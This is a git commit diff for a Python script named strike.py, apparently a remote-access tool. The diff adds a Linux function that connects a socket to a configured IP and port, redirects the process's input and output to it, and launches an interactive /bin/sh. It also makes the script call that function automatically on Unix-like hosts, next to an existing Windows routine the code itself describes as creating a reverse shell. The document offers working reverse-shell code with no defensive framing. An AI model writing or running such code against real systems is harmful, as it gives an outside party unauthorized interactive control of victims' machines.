7c3918d086945a270350db8a32a1fc1aff15f184
Gokul <146622216+huho-0@users.noreply.github.com>
2023-10-02 17:09:39 +0530

    strike.py

--- strike.py
+++ strike.py
@@ -5,7 +5,10 @@ import sys
 class Details:
     def __init__(self):
         self.os = os.name
+        self.ip = "0.0.0.0"
+        self.port = 9191
 
+    
     ## FOR WINDOWS
     def windows(self):
         """Function is only work if the host has a Windows Operating system It will create a Reverse Shell"""
@@ -49,10 +52,23 @@ class Details:
         else:
             print(f"Output: {stdout}")
 
+    #######LINUX###############
+    def linux(self):
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((self.ip,self.port))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        subprocess.call(["/bin/sh","-i"])
+        
+    
+    
+
     ## TO IDENTIFY THE HOST OS
     def os_define(self):
         if self.os == "posix":
             print("It's a Unix-like operating system (e.g., Linux)")
+            self.linux()
 
         elif self.os == "nt":
             print("It's a Windows-based operating system")
